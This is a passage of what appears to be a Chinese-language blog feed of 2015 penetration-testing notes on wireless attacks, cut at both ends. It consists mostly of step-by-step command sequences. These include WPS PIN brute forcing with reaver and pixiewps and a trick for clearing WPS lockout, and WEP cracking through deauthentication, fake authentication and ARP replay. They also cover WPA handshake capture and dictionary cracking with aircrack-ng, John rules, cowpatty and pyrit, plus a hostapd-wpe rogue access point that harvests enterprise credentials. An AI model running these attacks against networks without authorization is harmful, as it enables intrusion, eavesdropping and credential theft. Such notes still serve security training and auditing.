title="AIRTUN-NG"></a><strong>AIRTUN-NG</strong></h4></blockquote><ul><li>无线入侵检测wIDS<ul><li>无线密码和BSSID</li><li>需要获取握手信息</li></ul></li><li>中继和重放<ul><li>Repeate / Replay</li></ul></li></ul><h4 id="wIDS-无线入侵检测系统"><a href="#wIDS-无线入侵检测系统" class="headerlink" title="wIDS (无线入侵检测系统)"></a><strong>wIDS</strong> (无线入侵检测系统)</h4><pre><code>WEP:airtun-ng -a &lt;AP MAC&gt; -w SKA wlan2monWPA:airtun-ng -a &lt;AP MAC&gt; -p PSK -e kifi wlan2mon        #PSK AP密码ifconfig at0 up#四步握手#理论上支持多AP的wIDS,但2个AP以上时可靠性会下降    WPA:airtun-ng -a &lt;AP MAC&gt; -p PSK -e kifi1 wlan2mon    ifconfig at1 up    多AP不同信道时airodump -c 1,11 wlan2mon    dsniff -i at0            #密码嗅探    driftnet -i at0        #抓取流经网卡的图片信息    snort -v -i at0        #snort是一种基于规则匹配的网络入侵检测系统</code></pre><p><strong>AIRTUN-NG</strong></p><ul><li><strong>Repeate</strong>        #作中继器使用<ul><li>WDS/Bridge</li><li>扩展无线侦听的距离</li><li>要求两块网卡都置入monitor模式  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">airtun-ng -a &lt;AP MAC&gt; --repeat --bssid &lt;AP MAC&gt; -i wlan0mon wlan2mon</span><br><span class="line">wlan0mon: 收包网卡</span><br><span class="line">wlan2mon: 发包网卡</span><br><span class="line">-a: 发包的源地址</span><br><span class="line">--bssid: 过滤只发指定源地址的包(可选)</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>Replay</strong>        #重放<ul><li>将抓取的CAP文件重放到指定网卡<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">airtun-ng -a &lt;Source Mac&gt; -r 1.cap &lt;interface&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">besside-ng -h #主要功能:打掉STA与AP之间的关联,重而进行四步握手重连</span><br><span class="line">fern-wifi-cracker#整合aircrack-ng和reaver的GUI工具</span><br><span class="line">service network-manager stop</span><br><span class="line">airmon-ng check kill#运行fern-wifi-cracker前,先执行关闭manager服务和杀掉影响进程</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="无线侦察"><a href="#无线侦察" class="headerlink" title="无线侦察"></a><strong>无线侦察</strong></h4><pre><code>kismet    kismet*.nettxt    kismet*.pcapdump#需要GPS模块    apt-get install gpsd         #安装GPSD模块#映射GPS模块    demsg    #查看GPS模块设备路径gpsd -n -N -D4 /dev/ttyUSB0        giskismet -x Kismet-*.netxmlgiskismet -q &quot;select * from wireless&quot; -o gps.kml    #生成AP的地理位置信息文件,然后导入到Google地球查看</code></pre><p><strong>Google地球</strong><br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dl.google.com&#x2F;dl&#x2F;earth&#x2F;client&#x2F;current&#x2F;google-earth-stable_current_amd64.deb</span><br><span class="line">dpkg -i google-earth64.deb</span><br><span class="line">apt-get -f install</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> aircrack-ng </tag>
            
            <tag> wIDS </tag>
            
            <tag> wifite </tag>
            
            <tag> 无线侦察 </tag>
            
            <tag> GPS </tag>
            
            <tag> kismet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线密码破解之WPS攻击</title>
      <link href="/2015/09/17/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E4%B9%8BWPS%E6%94%BB%E5%87%BB/"/>
      <url>/2015/09/17/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E4%B9%8BWPS%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h4 id="WPS-Wireless-Protected-Setup-受保护的无线设置"><a href="#WPS-Wireless-Protected-Setup-受保护的无线设置" class="headerlink" title="WPS(Wireless Protected Setup) #受保护的无线设置"></a><strong>WPS</strong>(Wireless Protected Setup) #受保护的无线设置</h4><ul><li>WPS是WiFi联盟2006年开发的一项技术<ul><li>通过PIN码来简化无线接入的操作,无需记住PSK</li><li>路由器和网卡各按一个按钮就能接入无线</li><li>PIN码是分为前后各4位的2段共8位数字</li></ul></li><li>安全漏洞<ul><li>2011年被发现安全涉及漏洞</li><li>接入发起方可以根据路由器的返回信息判断前4位是否正确</li><li>而PIN码的后4位只有1000种定义的组合(最后一位是checksum)</li><li>所以全部穷举破解只需要1 1000次尝试<ul><li>PSK:218,340,105,584,896</li></ul></li><li>标准本身没有设计锁定机制,目前多个厂商已实现锁定机制</li><li>包括Linksys在内的很多厂家的无线路由器无法关闭WPS功能</li><li>即使在WEB界面中有关闭WPS,配置也不会生效</li><li>攻击难度相对较低,防御却十分困难</li><li>一般可在4-10小时爆破密码<ul><li>PSK</li></ul></li><li>用计算器直接算出pin<ul><li>C83A35,00B00C</li></ul></li></ul></li></ul><h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit:"></a><strong>exploit</strong>:</h4><pre><code>#启动侦听模式后,发现支持WPS的AP    wash -C -i wlan0mon    airodump-ng wlan0mon --wps#爆破PIN码    reaver -i wlan0mon -b &lt;AP MAC&gt; -vv -c 11#秒破PIN码    reaver -i wlan0mon -b &lt;AP MAC&gt; -vv -K 1    pixiewps    #只适用于固定厂商的芯片,成功率低reaver -i wlan0mon -b &lt;AP MAC&gt; -vv -p 88888888</code></pre><p><strong>常见问题</strong></p><ul><li>很多厂家实现了锁定机制,所以爆破时应注意限速</li><li>一旦触发锁定,可尝试耗尽AP连接数,令其重启并解除WPS锁定</li><li>最佳实践顺序  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">service network-manager stop#停止manager服务</span><br><span class="line">airmon-ng check kill#杀掉影响airmon使用的进程</span><br><span class="line">映射无线网卡(插网卡,或映射到虚拟机)</span><br><span class="line">ifconfig -a</span><br><span class="line">airmon-ng start wlan2</span><br><span class="line">iwconfig</span><br><span class="line">wash -i wlan2mon</span><br><span class="line">reaver -i wlan2mon -b &lt;AP MAC&gt; -c 1 -vv -K 1 </span><br><span class="line">reaver -i wlan2mon -b &lt;AP MAC&gt; -c 1 -vv</span><br><span class="line">pixiewps#使用pixiewps破解出PIN码</span><br><span class="line">reaver -i wlan2mon -b &lt;AP MAC&gt; -c 1 -vv -c 11 -p &lt;PIN码&gt; #利用PIN码查询出无线密码</span><br></pre></td></tr></table></figure></li></ul><p><strong>wifite</strong>        #综合自动化无线密码破解工具 </p><pre><code>wifite    #自动启用监听,傻瓜化破解工具wifite -h</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> aircrack-ng </tag>
            
            <tag> wifite </tag>
            
            <tag> 无线密码破解 </tag>
            
            <tag> WPS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线密码破解之WEP攻击</title>
      <link href="/2015/09/16/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E4%B9%8BWEP%E6%94%BB%E5%87%BB/"/>
      <url>/2015/09/16/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E4%B9%8BWEP%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<ul><li><p>MAC绑定</p><ul><li><p>管理员误以为MAC绑定是一种安全机制</p></li><li><p>限制可以关联的客户端MAC地址</p></li><li><p>准备AP</p><ul><li>AP基本配置</li><li>Open认证</li><li>开启无线过滤</li></ul></li><li><p>修改MAC地址绕过过滤</p></li></ul></li></ul><h4 id="WEP攻击"><a href="#WEP攻击" class="headerlink" title="WEP攻击"></a><strong>WEP攻击</strong></h4><ul><li>WEP共享密钥破解<ul><li>WEP密码破解原理<ul><li>IV并非完全随机</li><li>每224个包可能出现一次IV重用</li><li>收集大量IV之后找出相同IV及其对应密文,分析得出共享密码</li></ul></li><li>ARP回包中包含IV</li><li>IV足够多的情况下,任何复杂程度的WEP密码都可以被破解</li></ul></li></ul><h4 id="WEP共享密钥破解"><a href="#WEP共享密钥破解" class="headerlink" title="WEP共享密钥破解"></a><strong>WEP共享密钥破解</strong></h4><pre><code>tmux    #分3屏#启动monitor模式#启动抓包并保存抓包#Deauthentication抓取XOR文件    aireplay-ng -0 10 -a 目标AP_MAC -c 目标STA_MAC wlan0mon        #解除STA与AP之间的关联关系,然后重连抓取密钥流#利用XOR文件与AP建立关联    aireplay-ng -1 60 -e owl -y 密钥流.xor -a AP_MAC地址 -h HACKER_MAC地址 wlan2mon#执行ARP重放    #ARP:地址解析,把IP地址解析成MAC地址,工作在二层-链路层    aireplay-ng -3 -b 目标AP_MAC -h HACKER_MAC wlan2mons    #ARP重放攻击,收集IV(起始向量)#Deauthentication触发ARP数据包    aireplay-ng -0 10 -a 目标AP_MAC -c 目标STA_MAC wlan0mon    #重关联抓取受信任的ARP并执行重放#收集足够DATA之后破解密码aircrack-ng wap-01.cap    #收集足够IV包后,执行破解</code></pre><h4 id="FAKE-AUTHENTICATION"><a href="#FAKE-AUTHENTICATION" class="headerlink" title="FAKE AUTHENTICATION"></a><strong>FAKE AUTHENTICATION</strong></h4><ul><li>WEP破解全部需要首先伪造认证,以便与AP进行正常通信</li><li>不产生ARP数据包<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -1 0 -e kifi -a &lt;AP MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -1 60 -o 1 -q 10 -e &lt;ESSID&gt; -a &lt;AP MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;</span><br><span class="line">每6000秒发送reauthentication</span><br><span class="line">-o 1 每次身份认证只发一组认证数据包</span><br><span class="line">-q 10 每10秒发keep-live帧</span><br></pre></td></tr></table></figure></li></ul><h5 id="FAKE-AUTHENTICATION排错"><a href="#FAKE-AUTHENTICATION排错" class="headerlink" title="FAKE AUTHENTICATION排错"></a><strong>FAKE AUTHENTICATION排错</strong></h5><ul><li>某些AP验证客户端MAC地址OUI(前三个字节)</li><li>MAC地址过滤</li><li>Denied(Code 1) is WPA in use<ul><li>WPA/WPA2不支持Fake authentication</li></ul></li><li>使用真实MAC地址</li><li>物理靠近AP</li><li>侦听信道正确</li></ul><p><strong>DEAUTHENTICATION 攻击</strong></p><ul><li>强制客户端与AP断开关联<ul><li>重连生成ARP请求,AP回包包含IV</li><li>WPA重连过程抓取4步握手过程</li><li>无客户端情况下此攻击无效<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 0 -a &lt;AP MAC&gt; -c &lt;Client MAC&gt; &lt;interface name&gt;#-0 0 表示无限发包</span><br></pre></td></tr></table></figure></li><li>不指定-c参数时,以广播攻击所有客户端</li><li>每攻击发送128个包,64个给AP,64个给客户端</li><li>物理足够接近被攻击者</li></ul></li></ul><p><strong>DEAUTHENTICATION 排错</strong></p><ul><li>物理足够接近被攻击者</li><li>与被攻击者使用相同无线标准b,n,g</li><li>客户端可能拒绝广播帧,建议指定客户端</li></ul><h4 id="ARP重放"><a href="#ARP重放" class="headerlink" title="ARP重放"></a><strong>ARP重放</strong></h4><ul><li>侦听正常的ARP包并重放给AP</li><li>AP回包中包含大量弱IV  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -3 -b &lt;AP MAC&gt; -h &lt;Source MAC&gt; &lt;interface name&gt;</span><br><span class="line">-h 合法客户端&#x2F;供给者MAC</span><br><span class="line">Airodump-ng data字段</span><br><span class="line">64bit密钥:25万</span><br><span class="line">128bit密钥:150万</span><br></pre></td></tr></table></figure></li></ul><p><strong>WEP破解</strong></p><pre><code>Airecrack-ng wep.cap</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> aircrack-ng </tag>
            
            <tag> 无线密码破解 </tag>
            
            <tag> WEP </tag>
            
            <tag> tmux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线密码破解之WPA攻击及WPA企业版</title>
      <link href="/2015/09/13/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E4%B9%8BPA%E6%94%BB%E5%87%BB%E5%8F%8AWPA%E4%BC%81%E4%B8%9A%E7%89%88/"/>
      <url>/2015/09/13/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E4%B9%8BPA%E6%94%BB%E5%87%BB%E5%8F%8AWPA%E4%BC%81%E4%B8%9A%E7%89%88/</url>
      
        <content type="html"><![CDATA[<h4 id="WPA-PSK攻击"><a href="#WPA-PSK攻击" class="headerlink" title="WPA PSK攻击"></a><strong>WPA PSK攻击</strong></h4><ul><li>只有一种密码破解方法<ul><li>WPA不存在WEP的弱点</li></ul></li><li>只能暴力破解<ul><li>CPU资源</li><li>时间</li><li>字典质量<ul><li>网上共享的字典</li><li>泄露密码</li><li>地区电话号码段</li><li>Crunch生成字典</li><li>Kali中自带的字典文件</li></ul></li></ul></li></ul><h4 id="PSK破解过程"><a href="#PSK破解过程" class="headerlink" title="PSK破解过程"></a><strong>PSK破解过程</strong></h4><p><strong>启动monitor</strong></p><pre><code>service network-manager stopairmon-ng check killairmon-ng start wlan0iwconfigairodump-ng wlan0mon    #开启侦听</code></pre><p><strong>开始抓包并保存</strong></p><pre><code>airodump-ng wlan0mon --bssid &lt;指定AP MAC&gt; -c 11 -w wpa#Deauthentication攻击获取4步握手信息aireplay-ng -0 2 -a &lt;AP MAC&gt; -c &lt;STA MAC&gt; wlan0mon</code></pre><p><strong>使用字典暴力破解</strong></p><pre><code>cd /usr/share/wordlists                    #kali字典路径cd /usr/share/wfuzz/wordlist/others     #kali字典路径cd /usr/share/john/        #john破解工具所在路径ls password.lst            #john字典grep Password password.lst    #查看字典是否包含被破解的密码aircrack-ng -w /usr/share/john/password.lst wpa-01.cap        #使用字典执行爆破</code></pre><p><strong>无AP情况下的WPA密码破解</strong></p><ul><li><p>启动monitor</p></li><li><p>开始抓包并保存</p></li><li><p>根据probe信息伪造相同ESSID的AP    #可同时伪造多个AP</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">airbase-ng --essid &lt;伪造目标AP名&gt; -c 11 wlan0mon#伪造一个OPEN的AP</span><br><span class="line">airbase-ng --essid &lt;伪造目标AP名&gt; -c 11 -z 2 wlan0mon#伪造WPA1加密的AP</span><br><span class="line">airbase-ng --essid &lt;伪造目标AP名&gt; -c 11 -Z 4 wlan0mon#伪造WPA2加密的AP</span><br></pre></td></tr></table></figure></li><li><p>抓取四步握手中的前两个包</p></li><li><p>使用字典暴力破解</p></li></ul><h4 id="AIROLIB-破解密码"><a href="#AIROLIB-破解密码" class="headerlink" title="AIROLIB 破解密码"></a><strong>AIROLIB 破解密码</strong></h4><ul><li>设计用于存储ESSID和密码列表<ul><li>计算生成不变的PMK(计算资源消耗型)</li><li>PMK在破解阶段被用于计算PTK(速度快,计算资源要求少)</li><li>通过完整性摘要值破解密码</li><li>SQLite3数据库储存数据<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo kifi &gt; essid.txt#把wifi名写入文件</span><br><span class="line">airolib-ng db --import essid essid.txt#创建数据库并导入essid</span><br><span class="line">airolib-ng db --stats#查看数据库状态</span><br><span class="line">airolib-ng db --import passwd &lt;wordlist&gt;#导入密码字典</span><br><span class="line">自动剔除不合格的WPA字典</span><br><span class="line">airolib-ng db --batch#根据essid和字典密码组合计算4096hash,生成PMK</span><br><span class="line">生成PMK</span><br><span class="line">aircrack-ng -r db wpa.cap#读取数据库中的PMK,进行破解</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="JTR-破解密码"><a href="#JTR-破解密码" class="headerlink" title="JTR 破解密码"></a><strong>JTR 破解密码</strong></h4><ul><li><p>John the ripper</p><ul><li>快速的密码破解软件</li><li>支持基于规则扩展密码字典</li></ul></li><li><p>很多人喜欢用手机号码做无线密码</p><ul><li>获取号段并利用JTR规则增加最后几位的数字</li></ul></li><li><p>配置文件: <code>vi /etc/john/john.conf</code></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[List.Rules:Wordlist]</span><br><span class="line">$[0-9]$[0-9]$[0-9][0-9]</span><br></pre></td></tr></table></figure></li><li><p><strong>测试效果</strong></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist&#x3D;password.lst --rules --stdout | grep -i Password123</span><br></pre></td></tr></table></figure></li><li><p>调用动态字典,并执行破解</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist&#x3D;yd.txt --rules --stdout | aircrack-ng -e kifi -w -wpa.cap</span><br></pre></td></tr></table></figure></li><li><p>规则生成移动手机号密码破解</p></li></ul><h4 id="COWPATTY-破解密码"><a href="#COWPATTY-破解密码" class="headerlink" title="COWPATTY 破解密码"></a><strong>COWPATTY 破解密码</strong></h4><ul><li><p>WPA密码通用破解工具</p></li><li><p><strong>使用密码字典</strong></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cowpatty -r wpa.cap -f password.lst -s kifi</span><br></pre></td></tr></table></figure></li><li><p><strong>使用彩虹表</strong> (PMK)</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">genpmk -f password.lst -d pmkhash -s kifi#生成PMK并存放到pmkhash文件</span><br><span class="line">cowpatty -r wpa.cap -d pmkhash -s kifi#使用cowpatty工具调用彩虹表文件执行破解</span><br></pre></td></tr></table></figure></li></ul><h4 id="PYRIT-破解密码"><a href="#PYRIT-破解密码" class="headerlink" title="PYRIT 破解密码"></a><strong>PYRIT 破解密码</strong></h4><ul><li><p>与airolib,cowpatty相同,支持基于预计算的PMK提高破解速度</p></li><li><p>独有的优势</p><ul><li>除CPU之外pyrit可以运用GPU的强大运算能力加速生成PMK</li><li>本身支持抓包获取四步握手过程,无需用airodum抓包</li><li>也支持传统的读取airodump抓包获取四步握手的方式</li></ul></li><li><p><strong>只抓取WAP四次握手过程包</strong></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pyrit -r wlan2mon -o wpapyrit.cap stripLive#抓取四步握手包</span><br><span class="line">pyrit -r wpapyrit.cap analyze#对抓包结果进行分析</span><br></pre></td></tr></table></figure></li><li><p><strong>从airodump抓包导入并筛选</strong></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyrit -r wpa.cap -o wpapyrit.cap strip#airodump抓包需要转换pyrit包格式才可以使用</span><br></pre></td></tr></table></figure></li><li><p><strong>使用密码字典直接破解</strong></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyrit -r wpapyrit.cap -i password.lst -b &lt;AP MAC&gt; attack_passthrough</span><br></pre></td></tr></table></figure></li><li><p><strong>数据库模式破解</strong></p><ul><li>默认使用基于文件的数据库,支持连接SQL数据库,将计算的PMK存入数据库</li><li>查看默认数据库状态<ul><li><code>pyrit eval</code></li></ul></li><li>导入密码字典  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyrit -i password.lst import_passwords#默认剔除了不合规的密码</span><br></pre></td></tr></table></figure></li><li>指定ESSID  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyrit -e kifi create_essid</span><br></pre></td></tr></table></figure></li><li>计算PMK  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyrit batch#发挥GPU计算能力</span><br></pre></td></tr></table></figure></li><li><strong>破解密码</strong>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyrit -r wpapyrit.cap -b &lt;AP MAC&gt; attack_db</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="WPA企业"><a href="#WPA企业" class="headerlink" title="WPA企业"></a><strong>WPA企业</strong></h4><ul><li><strong>hostapd-wpe</strong><ul><li>取代了FreeRADIUS-wpe</li><li>EAP-FAST/MSCHAPv2(Phase 0)</li><li>PEAP/MSCHAPv2</li><li>EAP-TTLS/MSCHAPv2</li><li>EAP-TTLS/MSCHAP</li><li>EAP-TTLS/CHAP</li><li>EAP-TTLS/PAP</li></ul></li></ul><p><strong>安装</strong></p><pre><code>git clone https://github.com/OpenSecurityResearch/hostapd-wpeapt-get install libssl-dev libnl-devlibnl1,libnl-dev包不在kali2.0的官方库中wget http://ftp.debian.org/debian/pool/main/libn/libnl/libnl-dev_1.1-7_amd64.debwget http://ftp.debian.org/debian/pool/main/libn/libnl/libnl1_1.1-7_amd64.debdpkg -i libnl1_1.1-7_amd64.debdpkg -i libnl-dev_1.1-7_amd64.debwget http://hostap.epitest.fi/releases/hostapd-2.2.tar.gztar -zxf hostapd-2.2.tar.gzcd hostapd-2.2patch -p1 &lt; ../hostapd-wpe/hostapd-wpe.patch    #打补丁cd hostapdmake        #编译生成证书    cd ../../hostapd-wpe/certs    ./bootstrapservice network-manager stopairmon-ng check kill映射无线网卡ifconfig wlan2 up启动伪造AP    cd ../../hostapd-2.2/hostapd    ./hostapd-wpe hostapd-wpe.conf待用户连接伪造APasleap -C &lt;challenge&gt; -R &lt;response&gt; -W &lt;Dictionary_File&gt;    #执行破解</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> aircrack-ng </tag>
            
            <tag> WPA </tag>
            
            <tag> john </tag>
            
            <tag> pyrit </tag>
            
            <tag> 无线密码破解 </tag>
            
            <tag> cowpatty </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Aircrack-ng无线攻击套件</title>
      <link href="/2015/09/06/Wireless_Attacks/Aircrack-ng%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB%E5%A5%97%E4%BB%B6/"/>
      <url>/2015/09/06/Wireless_Attacks/Aircrack-ng%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB%E5%A5%97%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<blockquote><h4 id="AIRCRACK-NG基础"><a href="#AIRCRACK-NG基础" class="headerlink" title="AIRCRACK-NG基础"></a><strong>AIRCRACK-NG基础</strong></h4></blockquote><ul><li>无线渗透和审计神器</li><li>包含各种功能的工具套件<ul><li>网络检测</li><li>嗅探抓包</li><li>包注入</li><li>密码破解</li></ul></li></ul><p><strong>AIRMON-NG</strong></p><ul><li><p>检查完网卡驱动</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng#检查无线网卡驱动及芯片型号</span><br></pre></td></tr></table></figure></li><li><p><em>开启和停止无线侦听*</em></p><p>   airmon-ng check            #检查aircrack-ng套件和当前使用系统的兼容性<br>   airmon-ng check kill    #kill掉影响aircrack-ng使用的进程<br>   airmon-ng start wlan2 3    #开启无线网卡侦听,并指定3信道<br>   iwlist wlan2mon channel    #查看工作信道<br>   airmon-ng stop wlan2mon    #停止无线侦听</p></li></ul><p><strong>AIRODUMP-NG</strong></p><pre><code>#无线抓包airodump-ng wlan2mon    #扫描发现每一个信道里的APairodump-ng wlan2mon -c 1 --bssid 00:11:22:33:44:55 -w file.cap #抓指定信道1,指定AP的数据,并写入文件aireplay -9 wlan2mon airreplayairodump-ng wlan2monairodump-ng wlan2mon -c 1 --bssid 00:11:22:33:44:55 -w file.capairodump-ng wlan2mon -c 1 --bssid 00:11:22:33:44:55 -w file.cap --ivs</code></pre><ul><li><p>BSSID:AP的MAC地址</p></li><li><p>PWR:网卡接收到的信号强度,距离越近信号越强</p><ul><li>-1:驱动不支持信号强度,STA距离超出信号接受范围</li></ul></li><li><p>RXQ:最近10秒成功接收的数据帧的百分比(数据帧,管理帧),只有在固定信道时才会出现.</p></li><li><p>Beacons:接收到此AP发送的beacon帧数量</p></li><li><p>Data:抓到的数据帧数量(WEP表示IV数量),包含广播数据帧</p></li><li><p>/s:最近10秒内,每秒平均抓到的帧的数量</p></li><li><p>CH:信道号(从beacon帧中获得),信道重叠时可能发现其它信道</p></li><li><p>MB:AP支持的最大速率</p></li><li><p>ENC:采用的无线安全技术 WEP,WPA,WPA2,OPEN</p></li><li><p>CIPHER:采用的加密套件CCMP,TKIP,WEP40,WEP104</p></li><li><p>AUTH:身份认证方法MGT,PSK,SKA,OPEN</p></li><li><p>ESSID:无线网络名称,隐藏AP此值可能为空,airodump从probe和association request帧中发现隐藏AP</p></li><li><p>STATION:STA的MAC地址</p></li><li><p>Lost:通过sequence number判断最近10秒STA发送丢失的数据包数量(管理帧,数据帧)</p><ul><li>干扰,距离</li><li>发包不能收,收包不能发</li></ul></li><li><p>Packets:STA发送的数据包数量</p></li><li><p>Probes:STA探测的ESSID</p></li></ul><blockquote><h4 id="AIRODUMP-NG排错"><a href="#AIRODUMP-NG排错" class="headerlink" title="AIRODUMP-NG排错"></a>AIRODUMP-NG排错</h4></blockquote><ul><li>不显示任何AP和STA信息<ul><li>物理机场景下使用笔记本内置无线网卡时,确保BIOS中已启用无线网卡</li><li>确认无线网卡在managed模式下可以正常工作</li><li>尝试禁用network-manager服务</li><li>尝试卸载rmmod和重新加载modprobe驱动</li></ul></li><li>工作一段时间后airodump-ng无法继续抓包<ul><li><code>airmon-ng check kill</code></li><li>确认wpa_supplicant进程已停止</li></ul></li></ul><blockquote><h4 id="AIREPLAY-NG"><a href="#AIREPLAY-NG" class="headerlink" title="AIREPLAY-NG"></a>AIREPLAY-NG</h4></blockquote><ul><li>产生或者加速无线通信流量<ul><li>向无线网络中注入数据包<ul><li>伪造身份验证</li><li>强制重新身份验证</li><li>抓包重放</li></ul></li><li>用于后续WEP和WPA密码破解</li><li>支持10种包注入</li><li>获取包的两种途径<ul><li>指定接口(-i)</li><li>抓包文件pcap(-r)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng &lt;options&gt;&lt;interface name&gt;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li>Filter命令选项(除0,1两种攻击方式)</li><li>Replay命令选项</li></ul><h4 id="AIREPLAY-NG排错"><a href="#AIREPLAY-NG排错" class="headerlink" title="AIREPLAY-NG排错"></a><strong>AIREPLAY-NG排错</strong></h4><ul><li>Aireplay-ng命令挂起没有任何输出<ul><li>无线网卡与AP工作在不同信道</li></ul></li><li>报错”write failed:Cannot allocate memory wi_write():illegal seek”<ul><li>无线网卡使用Broadcom芯片(bcm43xx),替换为b43驱动可解决</li></ul></li><li>可注入但速度很慢,并提示内核消息”rtc:lost some interrupts at 1024Hz”<ul><li>没有修正方法,此时可以启动多个aireplay-ng命令提高速度</li></ul></li><li>使用-h参数指定注入MAC地址与网卡MAC地址不一致报错<ul><li>建议保持一致(macchange)</li></ul></li></ul><h4 id="AIREPLAY-NG包注入测试"><a href="#AIREPLAY-NG包注入测试" class="headerlink" title="AIREPLAY-NG包注入测试"></a><strong>AIREPLAY-NG包注入测试</strong></h4><ul><li>检测网卡是否可以注入包</li><li>检测AP的响应时间 